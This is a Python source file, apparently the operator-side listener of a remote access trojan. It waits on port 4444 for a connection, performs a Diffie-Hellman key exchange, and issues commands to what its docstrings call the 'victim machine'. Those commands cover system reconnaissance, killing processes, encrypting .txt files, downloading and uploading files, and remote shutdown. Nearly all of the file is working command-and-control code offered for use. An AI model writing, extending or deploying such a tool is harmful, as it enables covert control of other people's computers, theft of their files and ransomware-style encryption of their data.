__author__ = "Abenezer"

from Imports import *
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes

class KeyExchange:
    def __init__(self):
        # Use fixed parameters for consistency
        p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
        g = 2
        self.parameters = dh.DHParameterNumbers(p, g).parameters()
        # Generate private key
        self.private_key = self.parameters.generate_private_key()
        # Get public key
        self.public_key = self.private_key.public_key()
        
    def get_public_key_bytes(self):
        return self.public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
    def generate_shared_key(self, peer_public_key_bytes):
        try:
            peer_public_key = serialization.load_pem_public_key(peer_public_key_bytes)
            shared_key = self.private_key.exchange(peer_public_key)
            # Derive a key using HKDF
            derived_key = HKDF(
                algorithm=hashes.SHA256(),
                length=32,
                salt=None,
                info=b'handshake data',
            ).derive(shared_key)
            # Format the key for Fernet (must be 32 bytes, base64 encoded)
            return base64.urlsafe_b64encode(derived_key)
        except Exception as e:
            print(f"Error generating shared key: {str(e)}")
            return None

class Listner:
    def __init__(self, ip, port): 
        self.listner = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Creating the Listner's socket object
        self.listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1) # Making the socket object reusable
        self.listner.bind((ip,port)) # Binding the socket object
        self.listner.listen(3) # Making the socket object listen for an incomming connection ( 3 is the backlog number)
        self.shared_key = None
        
    def send(self,command,conn):
        """A function used for sending command to the victim machine""" 
        try:
            if isinstance(command, bytes):
                command = base64.b64encode(command).decode()
            # Ensure command is a string before JSON encoding
            if not isinstance(command, str):
                command = str(command)
            conn.send(json.dumps(command).encode())
        except Exception as e:
            print(f"Error sending command: {str(e)}")
   
    
    def recive(self,conn):
        """A function used for reciving command response from the victim machine"""
        json_data = ""
        while True:
            try:
                data = conn.recv(1024)
                if not data:
                    continue
                json_data += data.decode()
                try:
                    data = json.loads(json_data)
                    if isinstance(data, str) and data.startswith('base64:'):
                        return base64.b64decode(data[7:])
                    return data
                except json.JSONDecodeError:
                    continue
            except Exception as e:
                print(f"Error receiving data: {str(e)}")
                continue
      
      
    def download(self,path,data):
        """A function used for downloading a file from the victim machine"""
        
        with open(path,'wb') as file:
            file.write(base64.b64decode(data))
            
            
    def upload(self,path):
        """A function used for uploading a file to the victim machine"""
        
        with open(path,'rb') as file:
            return base64.b64encode(file.read())
        
    
    
    def start(self):
        """A function used for starting the listner"""
        print('[+] Waiting for incomming connecitons.....\n')
        conn, addr = self.listner.accept()
        print('[+] Connection has been established with IpAdress: {} and  PortNumber: {}\n'.format(addr[0],addr[1]))

        # Initialize key exchange
        key_exchange = KeyExchange()
        # Receive peer's public key
        peer_public_key = self.recive(conn)
        if isinstance(peer_public_key, str):
            peer_public_key = base64.b64decode(peer_public_key)
        # Send our public key
        self.send(key_exchange.get_public_key_bytes(), conn)
        # Generate shared key
        self.shared_key = key_exchange.generate_shared_key(peer_public_key)
        if self.shared_key is None:
            print("Failed to establish secure connection")
            conn.close()
            return

        print("\nAvailable commands:")
        print("  sysinfo     - Get system information")
        print("  bgps        - List background processes")
        print("  kill <name> - Kill a process by name")
        print("  encrypt     - Encrypt .txt files")
        print("  decrypt     - Decrypt .txt files")
        print("  cd <path>   - Change directory")
        print("  download <file> - Download a file")
        print("  upload <file>   - Upload a file")
        print("  shutdown    - Shutdown the system")
        print("  restart     - Restart the system")
        print("  logout      - Logout the user")
        print("  exit        - Exit the program")
        print("\nType 'help' to see this menu again\n")

        while True:
            try:
                # Clear any pending input
                import msvcrt
                while msvcrt.kbhit():
                    msvcrt.getch()
                
                # Get command with a clear prompt
                command = input('>> ').strip()
                if not command:
                    continue
                    
                if command.lower() == 'help':
                    print("\nAvailable commands:")
                    print("  sysinfo     - Get system information")
                    print("  bgps        - List background processes")
                    print("  kill <name> - Kill a process by name")
                    print("  encrypt     - Encrypt .txt files")
                    print("  decrypt     - Decrypt .txt files")
                    print("  cd <path>   - Change directory")
                    print("  download <file> - Download a file")
                    print("  upload <file>   - Upload a file")
                    print("  shutdown    - Shutdown the system")
                    print("  restart     - Restart the system")
                    print("  logout      - Logout the user")
                    print("  exit        - Exit the program")
                    print("  help        - Show this help menu\n")
                    continue
                
                self.send(command, conn)
                
                if command == "exit":
                    conn.close()
                    os.system('clear')
                    exit(0)
                
                commandresult = self.recive(conn)
                if commandresult is None:
                    print("No response received from victim")
                    continue
                    
                if command.split()[0].lower() == "sysinfo" and len(command.split()) == 1:
                    print("platform:",commandresult['platform'])
                    print("platform-release:", commandresult['platform-release'])
                    print("platform-version:",commandresult['platform-version'])
                    print("architecture:",commandresult['architecture'])
                    print("hostname:",commandresult['hostname'])
                    print("ip-address:",commandresult['ip-address'])
                    print("mac-address:",commandresult['mac-address'])
                    print("ram:",commandresult['ram'])
                
                elif command.split()[0].lower() == "bgps" and len(command.split()) == 1:
                    from pprint import prettyprinter
                    pprint = prettyprinter(indent=4)
                    pprint.pprint(commandresult)
                    
                elif command.split()[0].lower() == 'encrypt' and len(command.split()) == 1:
                    print(commandresult)
                    
                elif command.split()[0].lower() == "decrypt" and len(command.split()) == 1:
                    print(commandresult)
                    
                elif command.split()[0].lower() == "download" and len(command.split()) > 1:
                    self.download(command.split()[1],commandresult.encode())
                    print("file downloaded successfully!")
                    
                elif command.split()[0].lower() == "upload" and len(command.split()) > 1:
                    self.send(self.upload(command.split()[1]).decode(),conn)
                    print("file uploded successfully!")
                    
                else:
                    print(commandresult)
            except Exception as e:
                print(f"Error: {str(e)}")
                continue
                
    def __str__(self):
        return "Listner"



def main():
    """The main function"""
    
    listener = Listner('localhost',4444)
    listener.start()


if __name__ == "__main__":
    main()

